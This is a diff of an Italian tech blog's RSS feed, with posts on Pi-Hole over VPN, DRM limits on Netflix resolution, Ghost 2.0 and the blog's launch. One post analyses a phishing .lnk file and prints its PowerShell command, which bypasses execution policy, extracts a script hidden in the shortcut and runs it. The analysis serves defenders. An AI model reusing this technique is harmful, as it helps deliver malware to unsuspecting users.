-&lt;p&gt;Vi sorprenderà sapere infatti che insieme a loro c&amp;rsquo;è anche un&amp;rsquo;altra realtà di streaming, ben più importante e famosa, la quale consiglia l&amp;rsquo;uso di Edge e Internet Explorer per la massima qualità. Ebbene sì, sto parlando di Netflix.&lt;/p&gt;
-&lt;p&gt;Se andate sul sito ufficiale di Netflix, nella sezione relativa ai &lt;a href=&#34;https://help.netflix.com/it/node/23742&#34;&gt;requisiti di sistema&lt;/a&gt; vengono riportate anche le risoluzioni massime raggiungibili con i vari browser. Indovinate un po&amp;rsquo;? Chrome e Firefox cappati a 720p, Internet Explorer a 1080p, mentre Edge addirittura raggiunge uno splendido 4K.&lt;/p&gt;
-
-  &lt;figure class=&#34;left&#34; &gt;
-    &lt;img src=&#34;/images/2018-08-26-00_04_33-Requisiti-di-sistema-di-Netflix-per-lettori-HTML5-e-Silverlight.png&#34;   /&gt;
-    
-  &lt;/figure&gt;
-
-
-&lt;p&gt;Ora giustamente molti di voi saranno confusi, e lo capisco, perché tutti noi guardiamo regolarmente da YouTube e altre fonti video in 1080p (a volte anche 4K) senza il minimo problema con i browser più disparati.&lt;/p&gt;
-&lt;p&gt;Quindi&amp;hellip; perché? Cosa impedisce a Netflix/DAZN di sparare un FullHD/4K anche su Chrome o Firefox? Qual è la differenza tra servizi come Netflix/DAZN e YouTube? Perché quest&amp;rsquo;ultimo ci riesce mentre un colosso come Netflix no?&lt;/p&gt;
-&lt;p&gt;I colpevoli, ancora una volta, sono i sistemi per la gestione dei diritti d&amp;rsquo;autore.&lt;/p&gt;
-&lt;p&gt;Netflix su Chrome e Firefox utilizza &lt;strong&gt;Widevine DRM&lt;/strong&gt; con il criterio di licenza &lt;code&gt;SW_SECURE_DECODE&lt;/code&gt;. Con questo criterio i frame vengono decodificati dalla libreria Widevine anziché direttamente dalla CPU/GPU. Di conseguenza, i frame vengono decodificati senza alcun tipo di accelerazione hardware, il che significa che nei computer di fascia più bassa si possono riscontrare dei frame drop durante la riproduzione. Una situazione paradossale dove all&amp;rsquo;aumentare della qualità dello streaming peggiora la qualità della visione. Un&amp;rsquo;esperienza decisamente ben lontana dagli standard desiderati da Netflix.&lt;/p&gt;
-&lt;p&gt;Su Internet Explorer/Edge in Windows 10 invece, Netflix ha la possibilità di spingere la risoluzione dello streaming alla massima possibile. Questi due browser infatti utilizzano &lt;strong&gt;Playready&lt;/strong&gt; per lo streaming DRM, e poiché Playready è integrato direttamente in Windows 10, sfrutta l&amp;rsquo;accelerazione hardware del sistema permettendo una riproduzione snella e fluida anche ad elevate risoluzioni.&lt;/p&gt;
-&lt;p&gt;Tornando quindi alla domanda iniziale, perché DAZN consiglia Internet Explorer? Perché su Chrome potete vedere Netflix solo in 720p?&lt;/p&gt;
-&lt;p&gt;Per colpa dei DRM.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;#FuckDRM&lt;/strong&gt;&lt;/p&gt;
-
-        
-        </description>
-    </item>
-    
-    <item>
-      <title>Ghost 2.0 e si vola!</title>
-      <link>/post/ghost-2-0-e-si-vola/</link>
-      <pubDate>Tue, 21 Aug 2018 15:23:04 +0000</pubDate>
-      
-      <guid>/post/ghost-2-0-e-si-vola/</guid>
-      <description>
-        
-          &lt;img src=&#34;/images/editor.png&#34;/&gt;
-          
-        
-        
-        &lt;p&gt;Questo post non ha nessuna utilità, serve solo per testare se l&amp;rsquo;aggiornamento a Ghost 2.0 ha sfasciato qualcosa. Sembrerebbe tutto ok.&lt;/p&gt;
-&lt;p&gt;Hanno introdotto un nuovo editor alternativo, molto carino. Ora posso caricare i meme molto più velocemente.&lt;/p&gt;
-
-  &lt;figure class=&#34;center&#34; &gt;
-    &lt;img src=&#34;/images/DktdsqpWsAA8PzZ.jpg&#34;   /&gt;
-    
-  &lt;/figure&gt;
-
-
-&lt;p&gt;Ovviamente ci sono un sacco di altre cose molto belle che per il momento non mi interessano. Se volete più info: &lt;a href=&#34;https://blog.ghost.org/2-0/&#34;&gt;https://blog.ghost.org/2-0/&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;Per quel poco che l&amp;rsquo;ho usato mi sta davvero piacendo Ghost: è pulito, semplice e sta crescendo bene. GG WP.&lt;/p&gt;
-
-        
-        </description>
-    </item>
-    
-    <item>
-      <title>Malware nascosti in file .lnk</title>
-      <link>/post/malware-in-file-lnk/</link>
-      <pubDate>Fri, 13 Jul 2018 21:50:11 +0000</pubDate>
-      
-      <guid>/post/malware-in-file-lnk/</guid>
-      <description>
-        
-          &lt;img src=&#34;/images/cover-malware-in-file-lnk.jpg&#34;/&gt;
-          
-        
-        
-        &lt;p&gt;L&amp;rsquo;altro giorno mi è stata segnalata una mail malevola decisamente interessante.
-Il corpo del testo è abbastanza normale, nella media dello standard di oggi, fin qui nulla di strano.&lt;/p&gt;
-&lt;p&gt;Il bello però inizia quando si clicca il link per scaricare il file e iniziare così la catena di infezione.&lt;/p&gt;
-
-  &lt;figure class=&#34;center&#34; &gt;
-    &lt;img src=&#34;/images/2018-07-12-12_12_39-Fattura-SA-international-S.p.A.--0V-SC430KMU---Messaggio--HTML---Sola-lettura-.png&#34;   /&gt;
-    
-  &lt;/figure&gt;
-
-
-&lt;p&gt;Il download avviene tramite un sito legittimo compromesso, caso vuole che questo sito sia in HTTPS, quindi una protezione perimetrale senza inspection del traffico cifrato viene completamente bypassata. Ormai è imprescindibile avere un&amp;rsquo;ottima protezione Endpoint.&lt;/p&gt;
-&lt;p&gt;Ma andiamo avanti, il file scaricato si rivela essere un file &lt;code&gt;.zip&lt;/code&gt; da una decina di KB, una volta estratto mostra un collegamento con l&amp;rsquo;icona di Esplora Risorse.&lt;/p&gt;
-
-  &lt;figure class=&#34;center&#34; &gt;
-    &lt;img src=&#34;/images/2018-07-13-22_21_05-fattura-per-cliente-X8-HKGDC.png&#34;   /&gt;
-    
-  &lt;/figure&gt;
-
-
-&lt;p&gt;Se andiamo a verificare le proprietà del collegamento troviamo nel campo destinazione una stringa decisamente molto sospetta che termina per &lt;code&gt;.ps1&lt;/code&gt;, ovvero uno script per PowerShell.&lt;/p&gt;
-
-  &lt;figure class=&#34;center&#34; &gt;
-    &lt;img src=&#34;/images/2018-07-13-22_22_48-Propriet----fattura-per-cliente-X8-HKGDC.png&#34;   /&gt;
-    
-  &lt;/figure&gt;
-
-
-&lt;p&gt;I file .lnk sono infami, perché se vengono scansionati con un antimalware o caricati su un servizio online come VirusTotal, succede questo&amp;hellip;&lt;/p&gt;
-
-  &lt;figure class=&#34;center&#34; &gt;
-    &lt;img src=&#34;/images/2018-07-13-22_40_44-VirusTotal.png&#34;   /&gt;
-    
-  &lt;/figure&gt;
-
-
-&lt;p&gt;&amp;hellip;ovvero viene seguito il collegamento. Tutto legittimo? All Green? Safe? Certo che no!&lt;/p&gt;
-&lt;p&gt;Analizziamo la stringa contenuta nel campo Destinazione:&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass -c  findstr /s joe7jfo2sok %USERPROFILE%\\*.lnk  &amp;gt; %USERPROFILE%\Documents\fpoler.ps1;%USERPROFILE%\Documents\fpoler.ps1
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Vediamo nel dettaglio cosa fa:&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass -c
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Questa stringa chiama il processo di PowerShell con due parametri, &lt;code&gt;-ep bypass&lt;/code&gt;  per bypassare la policy di sistema che può eventualmente bloccare l&amp;rsquo;esecuzione di script non firmati (serve essere admin della macchina), e &lt;code&gt;-c&lt;/code&gt; per eseguire il tutto senza finestra.&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;findstr /s joe7jfo2sok %USERPROFILE%\\*.lnk
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Chiamata la PowerShell, viene eseguito il comando riportato sopra per cercare una particolare stringa in modo ricorsivo nella cartella dell&amp;rsquo;utente loggato, in tutti i file con estensione &lt;code&gt;.lnk&lt;/code&gt;. In questo caso cerca la stringa &lt;code&gt;joe7jfo2sok&lt;/code&gt;.&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;gt; %USERPROFILE%\Documents\fpoler.ps1;%USERPROFILE%\Documents\fpoler.ps1
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Una volta trovato il file, con il simbolo &lt;code&gt;&amp;gt;&lt;/code&gt; viene dirottato l&amp;rsquo;output in un nuovo file &lt;code&gt;fpoler.ps1&lt;/code&gt; e poi immediatamente eseguito.&lt;/p&gt;
-&lt;p&gt;Quindi, ricapitoliamo: se noi facciamo click su questo collegamento, ci apre una PowerShell nascosta che cerca ricorsivamente in tutta la cartella dell&amp;rsquo;utente un link contenente la stringa &lt;code&gt;joe7jfo2sok&lt;/code&gt;, quando lo trova, copia il contenuto nel file &lt;code&gt;fpoler.ps1&lt;/code&gt; e lo esegue.&lt;/p&gt;
-&lt;p&gt;&amp;hellip;WTF?&lt;/p&gt;
-
-  &lt;figure class=&#34;center&#34; &gt;
-    &lt;img src=&#34;/images/giphy.gif&#34;   /&gt;
-    
-  &lt;/figure&gt;
-
-
-&lt;p&gt;Come fa a funzionare questa roba? Dov&amp;rsquo;è il payload? Dov&amp;rsquo;è il link per scaricare il vero malware?&lt;/p&gt;
-&lt;p&gt;Proviamo a farlo girare su app.any.run:
-&lt;a href=&#34;https://app.any.run/tasks/b05cf063-82f1-4ae9-ab60-876bcb5f51c6&#34;&gt;https://app.any.run/tasks/b05cf063-82f1-4ae9-ab60-876bcb5f51c6&lt;/a&gt;&lt;/p&gt;
-
-  &lt;figure class=&#34;center&#34; &gt;
-    &lt;img src=&#34;/images/2018-07-13-23_06_30-fattura-per-cliente-X8-HKGDC.zip--MD5_-6B0E66CF0A2DFB6780EB02D21D1F3152----Inter.png&#34;   /&gt;
-    
-  &lt;/figure&gt;
-
-
-&lt;p&gt;Viene avviata la PowerShell e viene cercata quella stringa, e fin qui ci siamo, poi&amp;hellip; un momento, da dove arrivano tutti questi comandi? Com&amp;rsquo;è possibile?
-L&amp;rsquo;ultima cosa che abbiamo visto con l&amp;rsquo;analisi statica è la creazione del file &lt;code&gt;fpoler.ps1&lt;/code&gt;, probabilmente arrivano da lì.&lt;/p&gt;
-&lt;p&gt;Navighiamo nella VM alla ricerca del file e&amp;hellip;&lt;/p&gt;
-
-  &lt;figure class=&#34;center&#34; &gt;
-    &lt;img src=&#34;/images/2018-07-13-23_05_41-fattura-per-cliente-X8-HKGDC.zip--MD5_-6B0E66CF0A2DFB6780EB02D21D1F3152----Inter.png&#34;   /&gt;
-    
-  &lt;/figure&gt;
-
-
-&lt;p&gt;&amp;hellip;bingo!
+&lt;/code>&lt;/pre>&lt;p>La procedura per esportare il file .ovpn è la medesima riportata sopra.&lt;/p>
+&lt;h3 id="connettiamoci-alla-vpn">
+Connettiamoci alla VPN
+&lt;a href="#connettiamoci-alla-vpn" class="h-anchor" aria-hidden="true">#&lt;/a>
+&lt;/h3>
+&lt;p>Procediamo quindi all&amp;rsquo;installazione del client OpenVPN. Su Android vi consiglio OpenVPN for Android, poiché è un&amp;rsquo;alternativa OpenSource al client ufficiale e permette una personalizzazione più granulare.&lt;/p>
+&lt;p>Ora dovete solamente importare il profilo &lt;code>.ovpn&lt;/code> nell&amp;rsquo;app e provare a connettervi.&lt;/p>
+&lt;p>Nota: potete cambiare liberamente il nome della connessione. Per esempio io l&amp;rsquo;ho chiamata &lt;code>Casa&lt;/code>.&lt;/p>
+&lt;figure class="left" >
+&lt;img src="/images/Screenshot_20181102-153132.png" />
+&lt;/figure>
+&lt;p>Se tutto è stato fatto come da manuale, dovrebbe connettersi e dovreste riuscire a navigare.&lt;/p>
+&lt;figure class="left" >
+&lt;img src="/images/Screenshot--2-nov-2018-17_30_49-.png" />
+&lt;/figure>
+&lt;p>Come prova dell&amp;rsquo;effettiva navigazione con Pi-Hole, potete provare a visitare questo sito: &lt;a href="https://blockads.fivefilters.org/?pihole">https://blockads.fivefilters.org/?pihole&lt;/a>&lt;/p>
+&lt;figure class="left" >
+&lt;img src="/images/Screenshot_2018-11-02-Block-Ads--1.png" />
+&lt;/figure>
+&lt;p>Se vi restituisce questo messaggio, potete farvi i complimenti, avete appena creato la vostra &lt;strong>Virtual Private Pi-Holed Network&lt;/strong>!&lt;/p>
+&lt;h3 id="heading">
+&lt;a href="#heading" class="h-anchor" aria-hidden="true">#&lt;/a>
+&lt;/h3></description></item><item><title>Perché DAZN consiglia Edge e Internet Explorer?</title><link>/post/perche-dazn-consiglia-edge/</link><pubDate>Sun, 26 Aug 2018 12:41:07 +0000</pubDate><guid>/post/perche-dazn-consiglia-edge/</guid><description>
+&lt;img src="/images/dazn-og.jpg"/>
+&lt;p>L&amp;rsquo;altro giorno l&amp;rsquo;account ufficiale &lt;a href="https://twitter.com/DAZN_IT">@DAZN_IT&lt;/a> ha riportato una serie di consigli utili per migliorare la qualità dello streaming. Uno fra tutti, nello specifico il punto 4, ha fatto sbarellare tutti.&lt;/p>
+&lt;figure class="left" >
+&lt;img src="/images/2018-08-25-23_52_41-DAZN-Italia--@DAZN_IT--_-Twitter.png" />
+&lt;figcaption class="center" >Internet Explorer migliore di Chrome e Firefox? Questi sono pazzi.&lt;/figcaption>
+&lt;/figure>
+&lt;p>Ennesimo consiglio da tabaccai? Beh&amp;hellip; in questo specifico caso, non proprio.&lt;/p>
+&lt;p>Vi sorprenderà sapere infatti che insieme a loro c&amp;rsquo;è anche un&amp;rsquo;altra realtà di streaming, ben più importante e famosa, la quale consiglia l&amp;rsquo;uso di Edge e Internet Explorer per la massima qualità. Ebbene sì, sto parlando di Netflix.&lt;/p>
+&lt;p>Se andate sul sito ufficiale di Netflix, nella sezione relativa ai &lt;a href="https://help.netflix.com/it/node/23742">requisiti di sistema&lt;/a> vengono riportate anche le risoluzioni massime raggiungibili con i vari browser. Indovinate un po&amp;rsquo;? Chrome e Firefox cappati a 720p, Internet Explorer a 1080p, mentre Edge addirittura raggiunge uno splendido 4K.&lt;/p>
+&lt;figure class="left" >
+&lt;img src="/images/2018-08-26-00_04_33-Requisiti-di-sistema-di-Netflix-per-lettori-HTML5-e-Silverlight.png" />
+&lt;/figure>
+&lt;p>Ora giustamente molti di voi saranno confusi, e lo capisco, perché tutti noi guardiamo regolarmente da YouTube e altre fonti video in 1080p (a volte anche 4K) senza il minimo problema con i browser più disparati.&lt;/p>
+&lt;p>Quindi&amp;hellip; perché? Cosa impedisce a Netflix/DAZN di sparare un FullHD/4K anche su Chrome o Firefox? Qual è la differenza tra servizi come Netflix/DAZN e YouTube? Perché quest&amp;rsquo;ultimo ci riesce mentre un colosso come Netflix no?&lt;/p>
+&lt;p>I colpevoli, ancora una volta, sono i sistemi per la gestione dei diritti d&amp;rsquo;autore.&lt;/p>
+&lt;p>Netflix su Chrome e Firefox utilizza &lt;strong>Widevine DRM&lt;/strong> con il criterio di licenza &lt;code>SW_SECURE_DECODE&lt;/code>. Con questo criterio i frame vengono decodificati dalla libreria Widevine anziché direttamente dalla CPU/GPU. Di conseguenza, i frame vengono decodificati senza alcun tipo di accelerazione hardware, il che significa che nei computer di fascia più bassa si possono riscontrare dei frame drop durante la riproduzione. Una situazione paradossale dove all&amp;rsquo;aumentare della qualità dello streaming peggiora la qualità della visione. Un&amp;rsquo;esperienza decisamente ben lontana dagli standard desiderati da Netflix.&lt;/p>
+&lt;p>Su Internet Explorer/Edge in Windows 10 invece, Netflix ha la possibilità di spingere la risoluzione dello streaming alla massima possibile. Questi due browser infatti utilizzano &lt;strong>Playready&lt;/strong> per lo streaming DRM, e poiché Playready è integrato direttamente in Windows 10, sfrutta l&amp;rsquo;accelerazione hardware del sistema permettendo una riproduzione snella e fluida anche ad elevate risoluzioni.&lt;/p>
+&lt;p>Tornando quindi alla domanda iniziale, perché DAZN consiglia Internet Explorer? Perché su Chrome potete vedere Netflix solo in 720p?&lt;/p>
+&lt;p>Per colpa dei DRM.&lt;/p>
+&lt;p>&lt;strong>#FuckDRM&lt;/strong>&lt;/p></description></item><item><title>Ghost 2.0 e si vola!</title><link>/post/ghost-2-0-e-si-vola/</link><pubDate>Tue, 21 Aug 2018 15:23:04 +0000</pubDate><guid>/post/ghost-2-0-e-si-vola/</guid><description>
+&lt;img src="/images/editor.png"/>
+&lt;p>Questo post non ha nessuna utilità, serve solo per testare se l&amp;rsquo;aggiornamento a Ghost 2.0 ha sfasciato qualcosa. Sembrerebbe tutto ok.&lt;/p>
+&lt;p>Hanno introdotto un nuovo editor alternativo, molto carino. Ora posso caricare i meme molto più velocemente.&lt;/p>
+&lt;figure class="center" >
+&lt;img src="/images/DktdsqpWsAA8PzZ.jpg" />
+&lt;/figure>
+&lt;p>Ovviamente ci sono un sacco di altre cose molto belle che per il momento non mi interessano. Se volete più info: &lt;a href="https://blog.ghost.org/2-0/">https://blog.ghost.org/2-0/&lt;/a>&lt;/p>
+&lt;p>Per quel poco che l&amp;rsquo;ho usato mi sta davvero piacendo Ghost: è pulito, semplice e sta crescendo bene. GG WP.&lt;/p></description></item><item><title>Malware nascosti in file .lnk</title><link>/post/malware-in-file-lnk/</link><pubDate>Fri, 13 Jul 2018 21:50:11 +0000</pubDate><guid>/post/malware-in-file-lnk/</guid><description>
+&lt;img src="/images/cover-malware-in-file-lnk.jpg"/>
+&lt;p>L&amp;rsquo;altro giorno mi è stata segnalata una mail malevola decisamente interessante.
+Il corpo del testo è abbastanza normale, nella media dello standard di oggi, fin qui nulla di strano.&lt;/p>
+&lt;p>Il bello però inizia quando si clicca il link per scaricare il file e iniziare così la catena di infezione.&lt;/p>
+&lt;figure class="center" >
+&lt;img src="/images/2018-07-12-12_12_39-Fattura-SA-international-S.p.A.--0V-SC430KMU---Messaggio--HTML---Sola-lettura-.png" />
+&lt;/figure>
+&lt;p>Il download avviene tramite un sito legittimo compromesso, caso vuole che questo sito sia in HTTPS, quindi una protezione perimetrale senza inspection del traffico cifrato viene completamente bypassata. Ormai è imprescindibile avere un&amp;rsquo;ottima protezione Endpoint.&lt;/p>
+&lt;p>Ma andiamo avanti, il file scaricato si rivela essere un file &lt;code>.zip&lt;/code> da una decina di KB, una volta estratto mostra un collegamento con l&amp;rsquo;icona di Esplora Risorse.&lt;/p>
+&lt;figure class="center" >
+&lt;img src="/images/2018-07-13-22_21_05-fattura-per-cliente-X8-HKGDC.png" />
+&lt;/figure>
+&lt;p>Se andiamo a verificare le proprietà del collegamento troviamo nel campo destinazione una stringa decisamente molto sospetta che termina per &lt;code>.ps1&lt;/code>, ovvero uno script per PowerShell.&lt;/p>
+&lt;figure class="center" >
+&lt;img src="/images/2018-07-13-22_22_48-Propriet----fattura-per-cliente-X8-HKGDC.png" />
+&lt;/figure>
+&lt;p>I file .lnk sono infami, perché se vengono scansionati con un antimalware o caricati su un servizio online come VirusTotal, succede questo&amp;hellip;&lt;/p>
+&lt;figure class="center" >
+&lt;img src="/images/2018-07-13-22_40_44-VirusTotal.png" />
+&lt;/figure>
+&lt;p>&amp;hellip;ovvero viene seguito il collegamento. Tutto legittimo? All Green? Safe? Certo che no!&lt;/p>
+&lt;p>Analizziamo la stringa contenuta nel campo Destinazione:&lt;/p>
+&lt;pre tabindex="0">&lt;code>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass -c findstr /s joe7jfo2sok %USERPROFILE%\\*.lnk &amp;gt; %USERPROFILE%\Documents\fpoler.ps1;%USERPROFILE%\Documents\fpoler.ps1
+&lt;/code>&lt;/pre>&lt;p>Vediamo nel dettaglio cosa fa:&lt;/p>
+&lt;pre tabindex="0">&lt;code>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass -c
+&lt;/code>&lt;/pre>&lt;p>Questa stringa chiama il processo di PowerShell con due parametri, &lt;code>-ep bypass&lt;/code> per bypassare la policy di sistema che può eventualmente bloccare l&amp;rsquo;esecuzione di script non firmati (serve essere admin della macchina), e &lt;code>-c&lt;/code> per eseguire il tutto senza finestra.&lt;/p>
+&lt;pre tabindex="0">&lt;code>findstr /s joe7jfo2sok %USERPROFILE%\\*.lnk
+&lt;/code>&lt;/pre>&lt;p>Chiamata la PowerShell, viene eseguito il comando riportato sopra per cercare una particolare stringa in modo ricorsivo nella cartella dell&amp;rsquo;utente loggato, in tutti i file con estensione &lt;code>.lnk&lt;/code>. In questo caso cerca la stringa &lt;code>joe7jfo2sok&lt;/code>.&lt;/p>
+&lt;pre tabindex="0">&lt;code>&amp;gt; %USERPROFILE%\Documents\fpoler.ps1;%USERPROFILE%\Documents\fpoler.ps1
+&lt;/code>&lt;/pre>&lt;p>Una volta trovato il file, con il simbolo &lt;code>&amp;gt;&lt;/code> viene dirottato l&amp;rsquo;output in un nuovo file &lt;code>fpoler.ps1&lt;/code> e poi immediatamente eseguito.&lt;/p>
+&lt;p>Quindi, ricapitoliamo: se noi facciamo click su questo collegamento, ci apre una PowerShell nascosta che cerca ricorsivamente in tutta la cartella dell&amp;rsquo;utente un link contenente la stringa &lt;code>joe7jfo2sok&lt;/code>, quando lo trova, copia il contenuto nel file &lt;code>fpoler.ps1&lt;/code> e lo esegue.&lt;/p>
+&lt;p>&amp;hellip;WTF?&lt;/p>
+&lt;figure class="center" >
+&lt;img src="/images/giphy.gif" />
+&lt;/figure>
+&lt;p>Come fa a funzionare questa roba? Dov&amp;rsquo;è il payload? Dov&amp;rsquo;è il link per scaricare il vero malware?&lt;/p>
+&lt;p>Proviamo a farlo girare su app.any.run:
+&lt;a href="https://app.any.run/tasks/b05cf063-82f1-4ae9-ab60-876bcb5f51c6">https://app.any.run/tasks/b05cf063-82f1-4ae9-ab60-876bcb5f51c6&lt;/a>&lt;/p>
+&lt;figure class="center" >
+&lt;img src="/images/2018-07-13-23_06_30-fattura-per-cliente-X8-HKGDC.zip--MD5_-6B0E66CF0A2DFB6780EB02D21D1F3152----Inter.png" />
+&lt;/figure>
+&lt;p>Viene avviata la PowerShell e viene cercata quella stringa, e fin qui ci siamo, poi&amp;hellip; un momento, da dove arrivano tutti questi comandi? Com&amp;rsquo;è possibile?
+L&amp;rsquo;ultima cosa che abbiamo visto con l&amp;rsquo;analisi statica è la creazione del file &lt;code>fpoler.ps1&lt;/code>, probabilmente arrivano da lì.&lt;/p>
+&lt;p>Navighiamo nella VM alla ricerca del file e&amp;hellip;&lt;/p>
+&lt;figure class="center" >
+&lt;img src="/images/2018-07-13-23_05_41-fattura-per-cliente-X8-HKGDC.zip--MD5_-6B0E66CF0A2DFB6780EB02D21D1F3152----Inter.png" />
+&lt;/figure>
+&lt;p>&amp;hellip;bingo!
 Abbiamo trovato il downloader, ma resta la domanda di come è stato creato questo file.
 Questo script da dove è uscito?
-Come ha fatto un semplice &lt;code&gt;findstr&lt;/code&gt; a generare questo output da un .lnk?
-No, dev&amp;rsquo;essere per forza da qualche parte del file &lt;code&gt;.lnk&lt;/code&gt;, ma dove? In quale campo?&lt;/p&gt;
-&lt;p&gt;L&amp;rsquo;unica via è provare ad aprire il file &lt;code&gt;.lnk&lt;/code&gt; come testo, ma Esplora Risorse non ci permette di interagire con i &lt;code&gt;.lnk&lt;/code&gt; come se fossero file, dobbiamo trovare un&amp;rsquo;altra strada. Per esempio, rinominarlo con un comando da shell testuale, come appunto PowerShell, usando &lt;code&gt;Rename-Item&lt;/code&gt;.&lt;/p&gt;
-
-  &lt;figure class=&#34;center&#34; &gt;
-    &lt;img src=&#34;/images/2018-07-13-23_24_58-fattura-per-cliente-X8-HKGDC.png&#34;   /&gt;
-    
-  &lt;/figure&gt;
-
-
-&lt;p&gt;A questo punto basta aprire il file .txt con un editor comune e&amp;hellip;&lt;/p&gt;
-
-  &lt;figure class=&#34;center&#34; &gt;
-    &lt;img src=&#34;/images/2018-07-13-23_26_16-_C__Users_gabri_Downloads_fattura-per-cliente-X8-HKGDC_fattura-per-cliente-X8-HK.png&#34;   /&gt;
-    
-  &lt;/figure&gt;
-
-
-&lt;p&gt;&amp;hellip;GENIALE! Hanno nascosto lo script malevolo infilandolo in coda ad un file &lt;code&gt;.lnk&lt;/code&gt;, passando sotto i radar e restando invisibile a scanner antimalware ed Esplora Risorse, per poi venire &amp;ldquo;copiato&amp;rdquo; come output via PowerShell in un &lt;code&gt;.ps1&lt;/code&gt; ed eseguito, con lo scopo di scaricare il vero malware.&lt;/p&gt;
-
-        
-        </description>
-    </item>
-    
-    <item>
-      <title>echo &#34;Hello world!&#34;</title>
-      <link>/post/echo-hello-world/</link>
-      <pubDate>Fri, 13 Jul 2018 11:57:31 +0000</pubDate>
-      
-      <guid>/post/echo-hello-world/</guid>
-      <description>
-        
-          &lt;img src=&#34;/images/hello-world-program-php.png&#34;/&gt;
-          
-        
-        
-        &lt;p&gt;Da qualche parte si deve pur iniziare.&lt;br&gt;
-Questo blog nasce dalla voglia di avere un luogo dove scrivere qualcosa di più di un semplice tweet, senza dipendere da piattaforme di terze parti.&lt;br&gt;
-Mettendo insieme anche il desiderio di giocare un po&amp;rsquo; con AWS e roba nuova, ho deciso di usare Ghost e hostarlo su una EC2 t2.micro. Il dominio è registrato su Route 53.&lt;br&gt;
-In fase di setup ho provato con la t2.nano ma con mezzo giga di RAM non finiva nemmeno l&amp;rsquo;installazione per un timeout.&lt;br&gt;
+Come ha fatto un semplice &lt;code>findstr&lt;/code> a generare questo output da un .lnk?
+No, dev&amp;rsquo;essere per forza da qualche parte del file &lt;code>.lnk&lt;/code>, ma dove? In quale campo?&lt;/p>
+&lt;p>L&amp;rsquo;unica via è provare ad aprire il file &lt;code>.lnk&lt;/code> come testo, ma Esplora Risorse non ci permette di interagire con i &lt;code>.lnk&lt;/code> come se fossero file, dobbiamo trovare un&amp;rsquo;altra strada. Per esempio, rinominarlo con un comando da shell testuale, come appunto PowerShell, usando &lt;code>Rename-Item&lt;/code>.&lt;/p>
+&lt;figure class="center" >
+&lt;img src="/images/2018-07-13-23_24_58-fattura-per-cliente-X8-HKGDC.png" />
+&lt;/figure>
+&lt;p>A questo punto basta aprire il file .txt con un editor comune e&amp;hellip;&lt;/p>
+&lt;figure class="center" >
+&lt;img src="/images/2018-07-13-23_26_16-_C__Users_gabri_Downloads_fattura-per-cliente-X8-HKGDC_fattura-per-cliente-X8-HK.png" />
+&lt;/figure>
+&lt;p>&amp;hellip;GENIALE! Hanno nascosto lo script malevolo infilandolo in coda ad un file &lt;code>.lnk&lt;/code>, passando sotto i radar e restando invisibile a scanner antimalware ed Esplora Risorse, per poi venire &amp;ldquo;copiato&amp;rdquo; come output via PowerShell in un &lt;code>.ps1&lt;/code> ed eseguito, con lo scopo di scaricare il vero malware.&lt;/p></description></item><item><title>echo "Hello world!"</title><link>/post/echo-hello-world/</link><pubDate>Fri, 13 Jul 2018 11:57:31 +0000</pubDate><guid>/post/echo-hello-world/</guid><description>
+&lt;img src="/images/hello-world-program-php.png"/>
+&lt;p>Da qualche parte si deve pur iniziare.&lt;br>
+Questo blog nasce dalla voglia di avere un luogo dove scrivere qualcosa di più di un semplice tweet, senza dipendere da piattaforme di terze parti.&lt;br>
+Mettendo insieme anche il desiderio di giocare un po&amp;rsquo; con AWS e roba nuova, ho deciso di usare Ghost e hostarlo su una EC2 t2.micro. Il dominio è registrato su Route 53.&lt;br>
+In fase di setup ho provato con la t2.nano ma con mezzo giga di RAM non finiva nemmeno l&amp;rsquo;installazione per un timeout.&lt;br>
 Per ora sembra up &amp;amp; running, vediamo se riesco a non spaccare tutto.
 Il dominio è provvisorio, il nome pure, perché non so cosa mettere.
-E&amp;rsquo; tutto in costruzione, state buoni.&lt;/p&gt;
-
-        
-        </description>
-    </item>
-    
-    <item>
-      <title>Archive</title>
-      <link>/archive/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/archive/</guid>
-      <description>
-        
-          
-          
-          
-        
-        
-        
-        
-        </description>
-    </item>
-    
-    <item>
-      <title>Privacy Policy</title>
-      <link>/privacy-policy/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/privacy-policy/</guid>
-      <description>
-        
-          &lt;img src=&#34;/images/chris-yang-1tnS_BVy9Jk-unsplash-1.jpg&#34;/&gt;
-          
-        
-        
-        &lt;p&gt;Qui non ci sono tracker, annunci e cookie di nessun genere.&lt;/p&gt;
-&lt;p&gt;Il sito è generato con Hugo e ospitato su Github Pages.&lt;br&gt;
-Se consideri Github Pages lesivo della tua privacy, premi &lt;code&gt;Ctrl + W&lt;/code&gt; (&lt;code&gt;Command + W&lt;/code&gt; su Mac) per caricare una versione alternativa.&lt;/p&gt;
-&lt;p&gt;Buona lettura!&lt;/p&gt;
-
-        
-        </description>
-    </item>
-    
-    <item>
-      <title>whoami</title>
-      <link>/whoami/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/whoami/</guid>
-      <description>
-        
-          &lt;img src=&#34;/images/cover-whoami.webp&#34;/&gt;
-          
-        
-        
-        &lt;p&gt;✉️ light.key2932 AT fastmail DOT com&lt;/p&gt;
-&lt;p&gt;:)&lt;/p&gt;
-
-        
-        </description>
-    </item>
-    
-  </channel>
-</rss>
